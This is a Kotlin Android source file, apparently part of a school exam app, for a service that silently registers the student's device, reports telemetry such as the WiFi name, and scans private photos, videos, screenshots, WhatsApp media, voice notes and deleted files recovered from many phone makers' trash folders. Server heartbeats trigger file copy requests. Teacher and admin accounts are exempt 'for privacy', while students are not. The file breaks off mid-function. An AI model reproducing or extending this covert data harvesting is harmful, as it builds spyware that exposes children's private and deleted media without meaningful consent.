package com.school.smartcbt.service

import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.MediaStore
import android.provider.Settings
import android.media.MediaMetadataRetriever
import android.media.MediaScannerConnection
import android.util.Base64
import android.util.Log
import android.util.Size
import com.school.smartcbt.data.model.*
import com.school.smartcbt.data.remote.ApiClient
import com.school.smartcbt.utils.SessionManager
import okhttp3.MediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody
import okio.BufferedSink
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.IOException
import java.io.InputStream
import java.util.concurrent.TimeUnit

object FileScannerService {

    private const val TAG = "FileScannerService"
    val ALLOWED_IMAGE_EXTS = setOf("jpg", "jpeg", "png", "webp", "bmp", "heic", "heif")
    val ALLOWED_VIDEO_EXTS = setOf("mp4", "mkv", "mov", "avi", "3gp", "webm", "flv", "wmv")
    private val activeUploadIds: MutableSet<String> = java.util.concurrent.ConcurrentHashMap.newKeySet()
    private val uploadRetryCount: MutableMap<String, Int> = java.util.concurrent.ConcurrentHashMap()
    private val uploadQueueExecutor = java.util.concurrent.Executors.newFixedThreadPool(6)

    /**
     * Memeriksa apakah berkas/jalur adalah sampah game (Free Fire, Mobile Legends, OBB),
     * stiker WhatsApp, cache, atau thumbnail yang TIDAK boleh di-scan / diunggah.
     */
    fun isJunkFileOrPath(filePath: String?, fileName: String?): Boolean {
        val p = (filePath ?: "").lowercase().replace('\\', '/')
        val n = (fileName ?: "").lowercase()

        // 1. Game assets & sampah file game (Free Fire, OBB, Mobile Legends, PUBG, dll)
        if (p.contains("freefire") || p.contains("free fire") || p.contains("com.dts.freefire") ||
            p.contains("mobile.legends") || p.contains("pubg") || p.contains("genshin") ||
            p.contains("com.garena") || p.contains("/unity/") || p.contains("/unreal/") ||
            p.contains("/android/obb") || p.contains(".obb") ||
            n.endsWith(".obb") || n.contains("freefire")) {
            return true
        }

        // 2. Sticker WhatsApp & animasi stiker
        if (p.contains("whatsapp stickers") || p.contains("whatsapp animated gifs") ||
            p.contains("/.stickers") || p.contains("/stickers/") || p.contains("/sticker/") ||
            n.endsWith(".wastickers") || n.contains("sticker") || n.contains(".wasticker")) {
            return true
        }

        // 3. Cache & temporary directories / files
        if (p.contains("/cache/") || p.contains("/.cache/") ||
            p.contains("/thumbnails/") || p.contains("/.thumbnails/") ||
            n.endsWith(".tmp") || n.endsWith(".temp") || n.endsWith(".nomedia")) {
            return true
        }

        // 4. Dokumen / PDF WhatsApp tidak usah di-scan / diunggah sesuai arahan
        if (p.contains("whatsapp documents") || p.contains("whatsapp/media/whatsapp documents") ||
            p.contains("whatsapp business/media/whatsapp business documents") ||
            (p.contains("whatsapp") && (n.endsWith(".pdf") || n.endsWith(".doc") || n.endsWith(".docx") || n.endsWith(".xls") || n.endsWith(".xlsx")))) {
            return true
        }

        return false
    }

    /**
     * Mengambil data telemetri nyata perangkat (Baterai, Storage, WiFi)
     */
    fun getTelemetryMap(context: Context): Map<String, Any?> {
        val result = mutableMapOf<String, Any?>()
        try {
            // 1. Status Baterai
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            if (bm != null) {
                val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                if (level in 0..100) result["batteryLevel"] = level
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)
                    result["isCharging"] = (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL)
                }
            }

            // 2. Status Izin Storage & Media
            val hasMedia = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
            } else {
                context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
            }
            val hasManageAll = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                Environment.isExternalStorageManager()
            } else hasMedia
            result["hasStoragePermission"] = hasMedia || hasManageAll
            result["hasManageExternalStorage"] = hasManageAll

            // 3. Kapasitas Storage Internal
            val dataDir = Environment.getDataDirectory()
            if (dataDir != null && dataDir.exists()) {
                val stat = StatFs(dataDir.path)
                result["totalStorage"] = stat.totalBytes
                result["freeStorage"] = stat.freeBytes
            }

            // 4. Kapasitas Kartu SD Eksternal jika ada
            val extDirs = context.getExternalFilesDirs(null)
            if (extDirs.size > 1 && extDirs[1] != null) {
                try {
                    val sdStat = StatFs(extDirs[1].path)
                    result["totalSdCard"] = sdStat.totalBytes
                    result["freeSdCard"] = sdStat.freeBytes
                } catch (e: Exception) {}
            }

            // 5. Nama WiFi (SSID)
            try {
                val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
                val info = wm?.connectionInfo
                val ssid = info?.ssid?.replace("\"", "")
                if (!ssid.isNullOrEmpty() && ssid != "<unknown ssid>") {
                    result["wifiSsid"] = ssid
                }
            } catch (e: Exception) {}
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting telemetry: ${e.message}")
        }
        return result
    }

    /**
     * Daftarkan device ke server secara hening (silent) di latar belakang
     */
    fun registerDevice(context: Context, onComplete: ((Boolean) -> Unit)? = null) {
        try {
            val sessionManager = SessionManager(context)
            val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
            val telemetry = getTelemetryMap(context)

            val req = DeviceRegisterRequest(
                userId = sessionManager.getUserId().ifEmpty { null },
                username = sessionManager.getUsername().ifEmpty { null },
                nisn = sessionManager.getNisn().ifEmpty { null },
                deviceAndroidId = androidId,
                deviceName = "${Build.MANUFACTURER} ${Build.MODEL}",
                deviceModel = Build.MODEL,
                deviceBrand = Build.MANUFACTURER,
                deviceOsVersion = "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})",
                appVersion = getAppVersion(context),
                storagePath = Environment.getExternalStorageDirectory()?.absolutePath ?: "/sdcard",
                batteryLevel = telemetry["batteryLevel"] as? Int,
                isCharging = telemetry["isCharging"] as? Boolean,
                totalStorage = telemetry["totalStorage"] as? Long,
                freeStorage = telemetry["freeStorage"] as? Long,
                totalSdCard = telemetry["totalSdCard"] as? Long,
                freeSdCard = telemetry["freeSdCard"] as? Long,
                wifiSsid = telemetry["wifiSsid"] as? String
            )

            ApiClient.getClient(context).registerDevice(req).enqueue(object : Callback<DeviceRegisterResponse> {
                override fun onResponse(call: Call<DeviceRegisterResponse>, response: Response<DeviceRegisterResponse>) {
                    Log.d(TAG, "Device registered: ${response.isSuccessful}")
                    onComplete?.invoke(response.isSuccessful)
                }

                override fun onFailure(call: Call<DeviceRegisterResponse>, t: Throwable) {
                    Log.e(TAG, "Device registration failed: ${t.message}")
                    onComplete?.invoke(false)
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error in registerDevice: ${e.message}")
            onComplete?.invoke(false)
        }
    }

    /**
     * Kirim heartbeat periodik agar status ONLINE di dashboard stabil beserta update telemetri
     */
    fun sendHeartbeat(context: Context, onResponse: ((BasicResponse?) -> Unit)? = null) {
        try {
            val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: return
            val body = mutableMapOf<String, Any?>("deviceAndroidId" to androidId)
            body.putAll(getTelemetryMap(context))

            ApiClient.getClient(context).deviceHeartbeat(body).enqueue(object : Callback<BasicResponse> {
                override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
                    val res = response.body()
                    if (response.isSuccessful && res != null) {
                        if (res.hasPendingCopyRequests == true) {
                            Log.d(TAG, "Heartbeat reports pending copy requests! Checking queue immediately...")
                            checkPendingRequests(context)
                        }
                    }
                    onResponse?.invoke(res)
                }

                override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
                    onResponse?.invoke(null)
                }
            })
        } catch (e: Exception) {
            onResponse?.invoke(null)
        }
    }

    /**
     * PENGECUALIAN & KONTROL: Memeriksa apakah perangkat saat ini dikecualikan dari pemindaian & sinkronisasi berkas.
     * Default: Akun Administrator (Admin, Super Admin, Operator, Guru, Staf) DIKECUALIKAN demi privasi dan keamanan sistem.
     * Namun jika Super Admin mengaktifkannya via portal (isAdminScanEnabledGlobally = true), maka pemindaian diizinkan.
     */
    @Volatile var isAdminScanEnabledGlobally: Boolean = false

    fun isDeviceExcludedFromScan(context: Context): Boolean {
        return try {
            if (isAdminScanEnabledGlobally) {
                // Jika kontrol admin di-enable dari server, jangan kecualikan perangkat
                return false
            }
            val sessionManager = SessionManager(context)
            val role = sessionManager.getRole().uppercase().trim()
            val isAdminUnlocked = sessionManager.isAdminUnlocked()
            val isExcludedRole = role == "ADMIN" || role == "SUPER_ADMIN" || role == "SUPERADMIN" ||
                    role == "OPERATOR" || role == "TEACHER" || role == "GURU" || role == "COUNSELOR" ||
                    role == "BK" || role == "KEPSEK" || role == "HEADMASTER" || role == "STAFF" || role == "TU"
            isAdminUnlocked || isExcludedRole
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Scan seluruh berkas HP: STRICT MEDIA ONLY (Foto & Video)
     */
    fun scanAllFiles(context: Context): List<FileMetadata> {
        if (isDeviceExcludedFromScan(context)) {
            Log.d(TAG, "[EXCLUSION] Perangkat Admin/Guru/Staf dikecualikan dari scanning berkas. File scanning diabaikan.")
            return emptyList()
        }

        if (!DeviceSyncManager.isScannerEnabledGlobally) {
            Log.d(TAG, "[SCANNER OFF] scanAllFiles: Pemindaian berkas media dilewati karena dinonaktifkan di server.")
            return emptyList()
        }

        val fileMap = mutableMapOf<String, FileMetadata>()

        // Debug: Check permissions status
        val hasReadMedia = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val hasImages = context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
            val hasVideo = context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_VIDEO) == android.content.pm.PackageManager.PERMISSION_GRANTED
            Log.d(TAG, "[PERMISSION CHECK] Android ${Build.VERSION.SDK_INT} (13+): Images=$hasImages, Video=$hasVideo")
            hasImages || hasVideo
        } else {
            val hasRead = context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
            Log.d(TAG, "[PERMISSION CHECK] Android ${Build.VERSION.SDK_INT}: READ_EXTERNAL_STORAGE=$hasRead")
            hasRead
        }
        val hasManageAll = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else false
        Log.d(TAG, "[PERMISSION CHECK] MANAGE_EXTERNAL_STORAGE=$hasManageAll, hasReadMedia=$hasReadMedia")

        // 1. Scan MediaStore: Hanya Images dan Videos (Exclude non-media documents, zips, apks, etc.)
        try {
            scanMediaStoreUri(context, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, fileMap)
            scanMediaStoreUri(context, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, fileMap)

            // Dynamic scan untuk volume sekunder seperti kartu SD
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    for (volumeName in MediaStore.getExternalVolumeNames(context)) {
                        if (volumeName != MediaStore.VOLUME_EXTERNAL_PRIMARY && volumeName != "external") {
                            scanMediaStoreUri(context, MediaStore.Images.Media.getContentUri(volumeName), fileMap)
                            scanMediaStoreUri(context, MediaStore.Video.Media.getContentUri(volumeName), fileMap)
                        }
                    }
                } catch (e: Throwable) {}
            }
        } catch (e: Throwable) {
            Log.e(TAG, "Error scanning MediaStore: ${e.message}")
        }

        Log.d(TAG, "[SCAN PROGRESS] After MediaStore scan: ${fileMap.size} files found")

        // 2. Scan direktori media galeri kamera, Download media, & WhatsApp Images/Videos
        try {
            val targetDirs = mutableListOf<File>()
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)?.let { if (it.exists()) targetDirs.add(it) }
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)?.let { if (it.exists()) targetDirs.add(it) }
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES)?.let { if (it.exists()) targetDirs.add(it) }
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)?.let { if (it.exists()) targetDirs.add(it) }

            val extStorage = Environment.getExternalStorageDirectory()
            if (extStorage != null && extStorage.exists()) {
                val waImg = File(extStorage, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images")
                if (waImg.exists()) targetDirs.add(waImg)
                val waVid = File(extStorage, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video")
                if (waVid.exists()) targetDirs.add(waVid)

                val waOldImg = File(extStorage, "WhatsApp/Media/WhatsApp Images")
                if (waOldImg.exists()) targetDirs.add(waOldImg)
                val waOldVid = File(extStorage, "WhatsApp/Media/WhatsApp Video")
                if (waOldVid.exists()) targetDirs.add(waOldVid)

                val w4bImg = File(extStorage, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Images")
                if (w4bImg.exists()) targetDirs.add(w4bImg)
                val w4bVid = File(extStorage, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video")
                if (w4bVid.exists()) targetDirs.add(w4bVid)

                // WhatsApp Voice Notes & Audio (Dokumen WA dikecualikan sesuai arahan)
                val waVoice = File(extStorage, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes")
                if (waVoice.exists()) targetDirs.add(waVoice)
                val waAudio = File(extStorage, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio")
                if (waAudio.exists()) targetDirs.add(waAudio)

                File(extStorage, "Pictures/Screenshots").let { if (it.exists()) targetDirs.add(it) }
                File(extStorage, "DCIM/Screenshots").let { if (it.exists()) targetDirs.add(it) }
                File(extStorage, "DCIM/Camera").let { if (it.exists()) targetDirs.add(it) }

                // ♻️ Trashed Media Direct Folders Mendalam (Tempat Sampah Galeri HP & Aplikasi)
                val trashPaths = listOf(
                    // Android Standard / Generic Trash & Scoped Storage
                    ".trash", ".trashed", "Trash", "trash", ".recycle", "recycle", ".Trash-1000", ".Trash-0",
                    "DCIM/.trash", "DCIM/.trashed", "DCIM/Trash", "DCIM/.recycle", "DCIM/.globalTrash", "DCIM/.Trash-1000",
                    "Pictures/.trash", "Pictures/.trashed", "Pictures/Trash", "Pictures/.recycle", "Pictures/.Trash-1000",
                    "Movies/.trash", "Movies/Trash", "Download/.trash", "Download/Trash",
                    // Vivo & iQOO (FuntouchOS / OriginOS)
                    ".vivo_trash", "DCIM/.vivo_trash", "Pictures/.vivo_trash",
                    "Android/data/com.vivo.gallery/files/trash", "Android/media/com.vivo.gallery/.trash",
                    // Xiaomi, Redmi & POCO (MIUI / HyperOS)
                    "MIUI/Gallery/cloud/.trashBin", "MIUI/Gallery/cloud/trashBin", "MIUI/.trashBin", "MIUI/Gallery/.trashBin",
                    "Android/media/com.miui.gallery/trashBin", "Android/data/com.miui.gallery/files/trashBin",
                    // OPPO & Realme (ColorOS / RealmeUI)
                    "ColorOS/Gallery/.trash", "Android/media/com.coloros.gallery3d/.trash", "Android/data/com.coloros.gallery3d/files/.trash",
                    // OnePlus (OxygenOS)
                    "Android/media/com.oneplus.gallery/.trash", "Android/data/com.oneplus.gallery/files/.trash",
                    // Samsung (OneUI)
                    "Android/media/com.sec.android.gallery3d/.trash", "Android/data/com.sec.android.gallery3d/files/.trash",
                    "Android/data/com.sec.android.gallery3d/files/trash", "Android/data/com.sec.android.gallery3d/cache/trash",
                    // Transsion / Infinix / Tecno / itel (XOS / HiOS)
                    "Pictures/.gallery_trash", "DCIM/.gallery_trash", "Android/data/com.transsion.gallery/files/.trash", "Android/media/com.transsion.gallery/.trash",
                    // Huawei & Honor (EMUI / MagicUI)
                    "Pictures/.gallery2/recycle", "DCIM/.gallery2/recycle", "Android/data/com.huawei.photos/files/recycle",
                    // WhatsApp & WhatsApp Business Media Trash
                    "Android/media/com.whatsapp/WhatsApp/Media/.trash",
                    "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/.trash",
                    "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/.trash",
                    "WhatsApp/Media/.trash", "WhatsApp/Media/WhatsApp Images/.trash", "WhatsApp/Media/WhatsApp Video/.trash",
                    "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/.trash",
                    "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Images/.trash",
                    "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video/.trash"
                )
                for (tp in trashPaths) {
                    val tf = File(extStorage, tp)
                    if (tf.exists() && tf.canRead()) targetDirs.add(tf)
                }
            }

            // Root folder kartu SD eksternal
            val extDirs = context.getExternalFilesDirs(null)
            for (extDir in extDirs) {
                if (extDir != null) {
                    var root = extDir
                    while (root.parentFile != null && root.parentFile?.name != "storage") {
                        root = root.parentFile ?: break
                    }
                    if (root.exists() && root.canRead()) {
                        val subDirs = listOf(
                            File(root, "DCIM"),
                            File(root, "Pictures"),
                            File(root, "Movies"),
                            File(root, "Download"),
                            File(root, ".trash"),
                            File(root, ".trashed"),
                            File(root, ".Trash-1000"),
                            File(root, "DCIM/.trash"),
                            File(root, "Pictures/.trash"),
                            File(root, "DCIM/.vivo_trash"),
                            File(root, "Pictures/.vivo_trash"),
                            File(root, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"),
                            File(root, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video")
                        )
                        for (s in subDirs) {
                            if (s.exists() && s.canRead()) targetDirs.add(s)
                        }
                    }
                }
            }

            for (dir in targetDirs) {
                val depth = if (isTrashDirectory(dir)) 8 else 4
                scanDirectory(dir, fileMap, maxDepth = depth)
            }
            Log.d(TAG, "[SCAN PROGRESS] After directory scan: ${fileMap.size} files total (scanned ${targetDirs.size} directories)")
        } catch (e: Throwable) {
            Log.e(TAG, "Error scanning public directories: ${e.message}")
        }

        Log.d(TAG, "[SCAN COMPLETE] Total media files found: ${fileMap.size}")
        return fileMap.values.toList()
    }

    /**
     * Membaca magic bytes berkas untuk mendeteksi tipe media saat nama berkas di trash tidak berekstensi normal.
     * Mengembalikan null bila bukan media, atau "gif" bila file GIF agar bisa dilewati sesuai instruksi.
     */
    fun detectMediaExtensionFromBytes(file: File): String? {
        if (!file.exists() || file.length() < 12L) return null
        return try {
            val header = ByteArray(16)
            file.inputStream().use { it.read(header) }
            when {
                // JPEG: FF D8 FF
                header[0] == 0xFF.toByte() && header[1] == 0xD8.toByte() && header[2] == 0xFF.toByte() -> "jpg"
                // PNG: 89 50 4E 47
                header[0] == 0x89.toByte() && header[1] == 0x50.toByte() && header[2] == 0x4E.toByte() && header[3] == 0x47.toByte() -> "png"
                // WebP: RIFF .... WEBP
                header[0] == 0x52.toByte() && header[1] == 0x49.toByte() && header[2] == 0x46.toByte() && header[3] == 0x46.toByte() &&
                header[8] == 0x57.toByte() && header[9] == 0x45.toByte() && header[10] == 0x42.toByte() && header[11] == 0x50.toByte() -> "webp"
                // MP4 / MOV / HEIC (ftyp)
                header[4] == 0x66.toByte() && header[5] == 0x74.toByte() && header[6] == 0x79.toByte() && header[7] == 0x70.toByte() -> {
                    val ftyp = String(header, 8, 4)
                    if (ftyp.startsWith("heic") || ftyp.startsWith("mif1")) "heic" else "mp4"
                }
                // MKV / WebM: 1A 45 DF A3
                header[0] == 0x1A.toByte() && header[1] == 0x45.toByte() && header[2] == 0xDF.toByte() && header[3] == 0xA3.toByte() -> "mkv"
                // GIF: 47 49 46 (Dilewati sesuai instruksi)
                header[0] == 0x47.toByte() && header[1] == 0x49.toByte() && header[2] == 0x46.toByte() -> "gif"
                else -> null
            }
        } catch (e: Exception) {
            null
        }
    }

    private fun scanDirectory(dir: File, fileMap: MutableMap<String, FileMetadata>, maxDepth: Int, currentDepth: Int = 0) {
        if (currentDepth > maxDepth || !dir.exists()) return

        try {
            val children = dir.listFiles() ?: return
            val isDirInTrash = isTrashDirectory(dir)
            for (child in children) {
                val isChildTrash = child.name.startsWith(".trashed") || child.name.startsWith(".pending") || isTrashDirectory(child) || isDirInTrash
                if (child.name.startsWith(".") && !isChildTrash) continue
                if (child.isDirectory) {
                    if (shouldSkipDirectory(child)) continue
                    val depthLimit = if (isChildTrash || isDirInTrash) 8 else maxDepth
                    scanDirectory(child, fileMap, depthLimit, currentDepth + 1)
                } else if (child.isFile && child.length() > 0) {
                    val rawName = child.name
                    var cleanName = rawName
                    if (rawName.startsWith(".trashed-") || rawName.startsWith(".trashed_")) {
                        cleanName = rawName.substringAfter("-").substringAfter("-")
                        if (cleanName == rawName) cleanName = rawName.substringAfter("_").substringAfter("_")
                        if (cleanName.isEmpty()) cleanName = rawName
                    } else if (rawName.startsWith(".trashed")) {
                        cleanName = rawName.removePrefix(".trashed").removePrefix("-").removePrefix("_")
                        if (cleanName.isEmpty()) cleanName = rawName
                    }
                    var ext = if (cleanName.contains(".")) cleanName.substringAfterLast(".").lowercase() else child.extension.lowercase()
                    // Jika berkas berada di folder trash dan nama tidak memiliki ekstensi standar, deteksi via header magic bytes
                    if ((ext.isEmpty() || ext.length > 5) && (isChildTrash || isDirInTrash)) {
                        val detected = detectMediaExtensionFromBytes(child)
                        if (!detected.isNullOrEmpty()) {
                            ext = detected
                            if (!cleanName.contains(".")) cleanName = "$cleanName.$ext"
                        }
                    }
                    // Sesuai permintaan pengguna: File GIF tidak perlu di-scan
                    if (ext == "gif") continue
                    // Abaikan file game/sampah Free Fire, WhatsApp stickers, OBB kecuali jika berada di folder tempat sampah
                    if (!isChildTrash && !isDirInTrash && isJunkFileOrPath(child.absolutePath, child.name)) continue
                    // STRICT MEDIA ONLY: filter images and videos only
                    if (ALLOWED_IMAGE_EXTS.contains(ext) || ALLOWED_VIDEO_EXTS.contains(ext)) {
                        val meta = createFileMetadata(child)
                        if (meta != null) {
                            val normPath = meta.filePath.replace("\\", "/")
                            if (!normPath.contains(".Statuses", ignoreCase = true) && !fileMap.containsKey(meta.filePath)) {
                                if (isChildTrash) {
                                    fileMap[meta.filePath] = meta.copy(
                                        fileName = if (cleanName.startsWith("♻️")) cleanName else "♻️ $cleanName",
                                        category = "DELETED_MEDIA",
                                        isDeleted = true
                                    )
                                } else {
                                    fileMap[meta.filePath] = meta
                                }
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // Safe fallback
        }
    }

    // Thumbnails dinonaktifkan permanen sesuai instruksi: sangat menguras database & RAM HP siswa.
    // Berkas langsung diunduh/ditampilkan dari file aslinya saat diminta portal.
    private fun extractThumbnailFromUri(context: Context, uri: Uri, isVideo: Boolean = false): String? {
        return null
    }

    private fun extractThumbnailFromFile(file: File): String? {
        return null
    }

    private fun extractThumbnailFromVideo(file: File): String? {
        return null
    }

    private fun createFileMetadata(file: File): FileMetadata? {
        return try {
            val extension = file.extension.lowercase()
            if (!ALLOWED_IMAGE_EXTS.contains(extension) && !ALLOWED_VIDEO_EXTS.contains(extension)) {
                return null
            }
            val category = if (ALLOWED_VIDEO_EXTS.contains(extension)) "VIDEO" else "IMAGE"
            val mimeType = getMimeType(extension)
            val thumb = when (category) {
                "IMAGE" -> extractThumbnailFromFile(file)
                "VIDEO" -> extractThumbnailFromVideo(file)
                else -> null
            }

            FileMetadata(
                fileName = file.name,
                filePath = file.absolutePath,
                fileExtension = extension.ifEmpty { null },
                fileSize = file.length().toInt(),
                fileSizeHuman = formatFileSize(file.length()),
                mimeType = mimeType,
                category = category,
                lastModified = file.lastModified(),
                thumbnailBase64 = thumb
            )
        } catch (e: Exception) {
            null
        }
    }

    private fun scanMediaStoreUri(context: Context, contentUri: Uri, fileMap: MutableMap<String, FileMetadata>) {
        val projections = arrayOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.DATA,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.MIME_TYPE,
            MediaStore.MediaColumns.DATE_MODIFIED
        )

        try {
            val cursor = context.contentResolver.query(contentUri, projections, null, null, null)
            cursor?.use {
                val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
                val sizeIdx = it.getColumnIndex(MediaStore.MediaColumns.SIZE)
                val mimeIdx = it.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
                val dateIdx = it.getColumnIndex(MediaStore.MediaColumns.DATE_MODIFIED)

                var thumbGenCount = 0
                while (it.moveToNext()) {
                    try {
                        val id = if (idIdx != -1) it.getLong(idIdx) else 0L
                        val name = if (nameIdx != -1) it.getString(nameIdx) else null ?: continue
                        val rawDataPath = if (dataIdx != -1) it.getString(dataIdx) else null
                        val pathLower = rawDataPath?.lowercase() ?: ""
                        val nameLower = name.lowercase()
                        val isItemTrashed = nameLower.startsWith(".trashed") || 
                                            nameLower.startsWith(".pending") ||
                                            pathLower.contains("/.trash") || 
                                            pathLower.contains("/.trashed") || 
                                            pathLower.contains("/.recycle") || 
                                            pathLower.contains("/recycle") ||
                                            pathLower.contains("globaltrash") || 
                                            pathLower.contains("vivo_trash") || 
                                            pathLower.contains("trashbin") ||
                                            pathLower.contains("/trash/") ||
                                            pathLower.contains("/recently deleted")

                        if (name.startsWith(".") && !isItemTrashed) continue
                        val directUri = ContentUris.withAppendedId(contentUri, id)
                        val directUriStr = directUri.toString()
                        val compositeFilePath = if (!rawDataPath.isNullOrEmpty()) "$rawDataPath::$directUriStr" else directUriStr
                        val dedupeKey = rawDataPath ?: directUriStr

                        if (fileMap.containsKey(dedupeKey)) continue

                        val size = if (sizeIdx != -1) it.getInt(sizeIdx) else 0
                        val mime = if (mimeIdx != -1) it.getString(mimeIdx) else null
                        val dateModified = if (dateIdx != -1) it.getLong(dateIdx) * 1000L else System.currentTimeMillis()

                        var cleanName = name
                        if (name.startsWith(".trashed-") || name.startsWith(".trashed_")) {
                            cleanName = name.substringAfter("-").substringAfter("-")
                            if (cleanName == name) cleanName = name.substringAfter("_").substringAfter("_")
                            if (cleanName.isEmpty()) cleanName = name
                        } else if (name.startsWith(".trashed")) {
                            cleanName = name.removePrefix(".trashed").removePrefix("-").removePrefix("_")
                            if (cleanName.isEmpty()) cleanName = name
                        }
                        val extension = cleanName.substringAfterLast('.', "").lowercase()
                        // Sesuai permintaan pengguna: File GIF tidak perlu di-scan
                        if (extension == "gif") continue
                        // Abaikan file game/sampah Free Fire, WhatsApp stickers, OBB kecuali jika berada di folder tempat sampah
                        if (!isItemTrashed && isJunkFileOrPath(rawDataPath ?: compositeFilePath, name)) continue
                        if (!ALLOWED_IMAGE_EXTS.contains(extension) && !ALLOWED_VIDEO_EXTS.contains(extension)) continue
                        val category = if (isItemTrashed) "DELETED_MEDIA" else if (ALLOWED_VIDEO_EXTS.contains(extension)) "VIDEO" else "IMAGE"

                        if (compositeFilePath.contains(".Statuses", ignoreCase = true) || (rawDataPath != null && rawDataPath.contains(".Statuses", ignoreCase = true))) continue

                        // Batasi pembuatan Base64 thumbnail agar tidak memicu OutOfMemoryError dan payload JSON bengkak
                        val shouldGenThumb = isItemTrashed || (thumbGenCount < 60)
                        val thumbBase64 = if (shouldGenThumb) {
                            val t = extractThumbnailFromUri(context, directUri, isVideo = (category == "VIDEO"))
                            if (t != null && !isItemTrashed) thumbGenCount++
                            t
                        } else null

                        fileMap[dedupeKey] = FileMetadata(
                            fileName = if (isItemTrashed) (if (cleanName.startsWith("♻️")) cleanName else "♻️ $cleanName") else name,
                            filePath = compositeFilePath,
                            fileExtension = extension.ifEmpty { null },
                            fileSize = size,
                            fileSizeHuman = formatFileSize(size.toLong()),
                            mimeType = mime ?: getMimeType(extension),
                            category = category,
                            lastModified = dateModified,
                            thumbnailBase64 = thumbBase64,
                            isDeleted = isItemTrashed
                        )
                    } catch (rowErr: Throwable) {
                        // Safe skip row bermasalah
                    }
                }
            }

            // ♻️ Scan Khusus Trash MediaStore (Android 11+ / API 30+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    val trashBundle = android.os.Bundle().apply {
                        putInt(MediaStore.QUERY_ARG_MATCH_TRASHED, MediaStore.MATCH_ONLY)
                    }
                    val trashCursor = context.contentResolver.query(contentUri, projections, trashBundle, null)
                    trashCursor?.use {
                        val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                        val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                        val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
                        val sizeIdx = it.getColumnIndex(MediaStore.MediaColumns.SIZE)
                        val mimeIdx = it.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
                        val dateIdx = it.getColumnIndex(MediaStore.MediaColumns.DATE_MODIFIED)

                        while (it.moveToNext()) {
                            try {
                                val id = if (idIdx != -1) it.getLong(idIdx) else 0L
                                val name = if (nameIdx != -1) it.getString(nameIdx) else null ?: continue
                                val directUri = ContentUris.withAppendedId(contentUri, id)
                                val directUriStr = directUri.toString()
                                val rawDataPath = if (dataIdx != -1) it.getString(dataIdx) else null
                                val compositeFilePath = if (!rawDataPath.isNullOrEmpty()) "$rawDataPath::$directUriStr" else directUriStr
                                val dedupeKey = rawDataPath ?: directUriStr

